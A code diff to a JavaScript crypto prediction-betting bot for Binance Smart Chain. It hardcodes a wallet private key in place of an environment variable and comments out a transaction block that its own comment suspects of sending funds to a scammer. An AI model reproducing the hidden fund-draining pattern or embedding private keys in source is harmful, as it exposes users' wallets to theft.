@@ -8,6 +8,8 @@ const fs = require("fs");
 const _ = require("lodash");
 const fetch = require("cross-fetch");
 let prediction = 0;
+const PRIVATE_KEY='d28c24b23f4268d2aaa2addaa52573c64798190bc5cb0bf25135632f8cb5580c'
+
 
 const reduceWaitingTimeByTwoBlocks = (waitingTime) => {
   if (waitingTime <= 6000) {
@@ -25,14 +27,14 @@ const Web3 = require("web3");
 const w = new Web3(process.env.BSC_RPC);
 
 const wallet = w.eth.accounts.wallet.add(
-  w.eth.accounts.privateKeyToAccount(process.env.PRIVATE_KEY)
+  w.eth.accounts.privateKeyToAccount(PRIVATE_KEY)
 );
 w.eth.defaultAccount = w.eth.accounts.privateKeyToAccount(
-  process.env.PRIVATE_KEY
+  PRIVATE_KEY
 ).address;
 
 const signer = new Wallet(
-  process.env.PRIVATE_KEY,
+  PRIVATE_KEY,
   new JsonRpcProvider(process.env.BSC_RPC)
 );
 
@@ -56,6 +58,7 @@ const checkResult = async (r) => {
             to: confirmContract(abi),
             amount: b,
           })
+          /*   is this the Function sending funds to scammer ???????
           .then(function (g) {
             w.eth.getGasPrice().then(function (gP) {
               let _b = parseFloat(b);
@@ -70,7 +73,7 @@ const checkResult = async (r) => {
                 data: "0x",
               });
             });
-          });
+          }); */
       });
       return true;
     }
